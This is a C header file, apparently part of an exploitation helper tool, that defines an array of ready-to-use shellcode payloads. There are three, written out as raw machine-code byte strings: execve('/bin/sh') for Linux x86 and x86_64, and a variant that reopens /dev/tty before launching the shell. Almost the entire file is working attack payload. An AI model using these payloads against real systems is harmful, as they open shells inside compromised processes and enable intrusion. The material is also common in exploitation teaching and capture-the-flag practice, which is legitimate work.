/*
 * Copyright (C) 2014 Olivier Gayot
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#ifndef SHELLCODES_H
#define SHELLCODES_H

typedef struct {
    char *name;
    char *payload;
} shellcode_t;

shellcode_t common_shellcodes_g[] = {
    {
        .name = "Linux x86\n"
            "\texecve(\"/bin/sh\", 0, 0)",
        .payload = "\x68\x2f\x73\x68\xff"
            "\xfe\x44\x24\x03"
            "\x68\x2f\x62\x69\x6e"
            "\x31\xc0"
            "\xb0\x0b"
            "\x89\xe3"
            "\x31\xc9"
            "\x31\xd2"
            "\xcd\x80"
    }, {
        .name = "Linux x86\n"
            "\tclose(0); open(\"/dev/tty\", 0); execve(\"/bin/sh\", 0, 0)",
        .payload = "\x83\xec\x09"
            "\x31\xc0"
            "\xb0\x06"
            "\x31\xdb"
            "\xcd\x80"
            "\xc7\x04\x24\x2f\x64\x65\x76"
            "\xc7\x44\x24\x04\x2f\x74\x74\x79"
            "\xc0\x6c\x24\x08\x08"
            "\x31\xc0"
            "\xb0\x05"
            "\x89\xe3"
            "\x31\xc9"
            "\xcd\x80"
            "\xc7\x04\x24\x2f\x62\x69\x6e"
            "\xc7\x44\x24\x04\xff\x2f\x73\x68"
            "\xb0\x0b"
            "\x89\xe3"
            "\xc1\x6b\x04\x08"
            "\x31\xc9"
            "\x31\xd2"
            "\xcd\x80"
    }, {
        .name = "Linux x86_64\n"
            "\texecve(\"/bin/sh\", 0, 0)",
        .payload = "\x68\x2f\x62\x69\x6e"
            "\xc7\x44\x24\x04\x2f\x73\x68"
            "\xff"
            "\xfe\x44\x24\x07"
            "\x48\x31\xc0"
            "\xb0\x3b"
            "\x48\x89\xe7"
            "\x48\x31\xf6"
            "\x48\x31\xd2"
            "\x0f\x05"
    },
};

#define SHELLCODE_COUNT \
    ((int)(sizeof(common_shellcodes_g) / sizeof(common_shellcodes_g[0])))


#endif /* SHELLCODES_H */
